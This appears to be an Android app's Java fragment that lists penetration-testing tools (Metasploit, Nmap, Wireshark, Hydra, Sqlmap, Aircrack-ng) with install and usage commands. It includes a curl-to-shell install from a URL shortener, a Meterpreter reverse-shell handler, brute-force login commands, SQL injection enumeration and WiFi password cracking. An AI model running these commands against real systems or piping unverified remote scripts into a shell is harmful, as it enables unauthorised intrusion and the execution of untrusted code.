package com.termux.tools.fragments;

import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import com.termux.tools.R;
import com.termux.tools.adapter.ToolsAdapter;
import com.termux.tools.dialogs.ToolInfoDialog;
import com.termux.tools.model.Tool;
import java.util.ArrayList;
import java.util.List;

public class OfflineResourcesFragment extends Fragment implements ToolsAdapter.OnItemClickListener {
	
	private RecyclerView recyclerView;
	private ToolsAdapter adapter;
	private List<Tool> toolList;
	
	@Override
	public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
		View view = inflater.inflate(R.layout.fragment_offline_resources, container, false);
		
		recyclerView = view.findViewById(R.id.recyclerViewTools);
		recyclerView.setLayoutManager(new LinearLayoutManager(getContext()));
		
		initializeTools();
		
		adapter = new ToolsAdapter(toolList, this);
		recyclerView.setAdapter(adapter);
		
		return view;
	}
	
	private void initializeTools() {
		toolList = new ArrayList<>();
		
		// Metasploit
		toolList.add(new Tool(
		"Metasploit",
		"Penetration testing framework",
		"The Metasploit Framework is an open-source platform for developing, testing, and executing exploits. It provides comprehensive infrastructure, content, and tools to perform penetration tests and security assessments.\n\nKey Features:\n• Extensive exploit database\n• Payload generation\n• Post-exploitation modules\n• Automated testing capabilities",
		"pkg update -y && pkg upgrade -y && pkg install curl wget git -y && termux-setup-storage && source <(curl -fsSL https://kutt.it/msf)",
		"msfconsole\n# Start Metasploit console\nuse exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset LHOST your_ip\nset LPORT 4444\nexploit",
		R.drawable.ic_metasploit
		));
		
		// Nmap
		toolList.add(new Tool(
		"Nmap",
		"Network discovery and security auditing",
		"Nmap (Network Mapper) is a free and open-source utility for network discovery and security auditing. It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, and what type of packet filters/firewalls are in use.\n\nKey Features:\n• Host discovery\n• Port scanning\n• Version detection\n• OS detection",
		"pkg install nmap -y",
		"nmap -sP 192.168.1.0/24\n# Ping scan the network\nnmap -sS target.com\n# TCP SYN scan\nnmap -O target.com\n# OS detection\nnmap -sV target.com\n# Version detection",
		R.drawable.ic_nmap
		));
		
		// Wireshark
		toolList.add(new Tool(
		"Wireshark",
		"Network protocol analyzer",
		"Wireshark is a network protocol analyzer that lets you see what's happening on your network at a microscopic level. It is the de facto standard across many industries and educational institutions for network troubleshooting, analysis, and communications protocol development.\n\nKey Features:\n• Deep inspection of hundreds of protocols\n• Live capture and offline analysis\n• Rich VoIP analysis\n• Standard three-pane packet browser",
		"pkg update && pkg install -y git && git clone https://github.com/Dark-Legends/wireshark-termux && cd wireshark-termux && chmod +x wireshark.sh && ./wireshark.sh && chmod +x wireshark && ./wireshark",
		"# For CLI version use tshark\ntshark -i wlan0\n# Capture on wireless interface\ntshark -r capture.pcap\n# Read from file\ntshark -f \"tcp port 80\"\n# Filter HTTP traffic\ntshark -i any -w capture.pcap\n# Capture all interfaces",
		R.drawable.ic_wireshark
		));
		
		// Hydra
		toolList.add(new Tool(
		"Hydra",
		"Password cracking tool",
		"Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.\n\nKey Features:\n• Multiple protocol support\n• Parallel attacks\n• Flexible user/password input\n• Restore aborted sessions",
		"pkg update && pkg install -y git build-essential cmake && rm -rf thc-hydra && git clone https://github.com/vanhauser-thc/thc-hydra.git && cd thc-hydra && ./configure --prefix=$PREFIX --disable-xhydra && make && make install && hydra -h",
		"hydra -l user -P passlist.txt ssh://192.168.1.1\nhydra -L users.txt -P passwords.txt ftp://target.com\nhydra -l admin -P rockyou.txt http-get://target.com/admin\nhydra -l user -P pass.txt smb://target.com",
		R.drawable.ic_hydra
		));
		
		// Sqlmap
		toolList.add(new Tool(
		"Sqlmap",
		"SQL injection automation tool",
		"sqlmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches for database fingerprinting, data fetching, and more.\n\nKey Features:\n• Full support for multiple DBMS\n• Six SQL injection techniques\n• Direct database connection\n• Password hash recognition",
		"pkg update && pkg install -y git python && git clone https://github.com/sqlmapproject/sqlmap.git && cd sqlmap && python sqlmap.py",
		"python sqlmap.py sqlmap -u \"http://site.com/page.php?id=1\"\npython sqlmap.py sqlmap -u \"http://site.com/page.php\" --data=\"id=1\"\npython sqlmap.py sqlmap -u \"http://site.com/page.php?id=1\" --dbs\npython sqlmap.py sqlmap -u \"http://site.com/page.php?id=1\" -D dbname --tables\npython sqlmap.py sqlmap -u \"http://site.com/page.php?id=1\" -D dbname -T users --columns",
		R.drawable.ic_sqlmap
		));
		
		// Aircrack-ng
		toolList.add(new Tool(
		"Aircrack-ng",
		"WiFi security auditing tools",
		"Aircrack-ng is a complete suite of tools to assess WiFi network security. It focuses on different areas of WiFi security: monitoring, attacking, testing, and cracking. Aircrack-ng works primarily with WiFi network interfaces and supports most wireless network cards.\n\nKey Features:\n• Packet capture and injection\n• WEP and WPA-PSK cracking\n• WiFi network monitoring\n• Fake access point creation",
		"pkg update && pkg install -y git build-essential openssl openssl-tool autoconf automake libtool && rm -rf aircrack-ng && git clone https://github.com/aircrack-ng/aircrack-ng.git && cd aircrack-ng && autoreconf -i && ./configure --prefix=$PREFIX && make && make install && aircrack-ng",
		"airmon-ng start wlan0\nairodump-ng wlan0mon\nairodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon\naircrack-ng -w wordlist.txt capture-01.cap\n# Crack WiFi password",
		R.drawable.ic_aircrack
		));
	}
	
	@Override
	public void onItemClick(Tool tool) {
		// Show tool info in dialog instead of starting new activity
		ToolInfoDialog dialog = new ToolInfoDialog(
		getActivity(),
		tool.getName(),
		tool.getDescription(),
		tool.getDetailedInfo(),
		tool.getInstallCommands(),
		tool.getUsageCommands(),
		tool.getImageResource()
		);
		dialog.show();
	}
}